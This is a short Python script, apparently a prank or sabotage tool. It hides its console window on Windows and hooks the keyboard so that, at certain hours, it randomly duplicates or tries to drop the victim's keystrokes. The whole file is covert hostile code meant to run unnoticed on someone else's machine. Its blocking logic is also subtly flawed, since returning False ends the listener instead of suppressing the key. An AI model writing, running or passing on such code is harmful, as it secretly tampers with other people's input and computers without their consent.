import ctypes
import random
from pynput import keyboard
import datetime

DUPLICATE_PROBABILITY = 0.07
BLOCK_PROBABILITY = 0.07

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    current_hour = datetime.datetime.now().hour
    if '1' in str(current_hour) or '4' in str(current_hour):
        rand_num = random.random()
        if rand_num < DUPLICATE_PROBABILITY:
            try:
                keyboard.Controller().press(key)
                keyboard.Controller().release(key)
            except:
                pass
        elif rand_num < BLOCK_PROBABILITY + DUPLICATE_PROBABILITY:
            return False
    else:
        return True  # Allow key press to pass through if not in active hours

def on_release(key):
    if key == keyboard.Key.end:
        exit()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
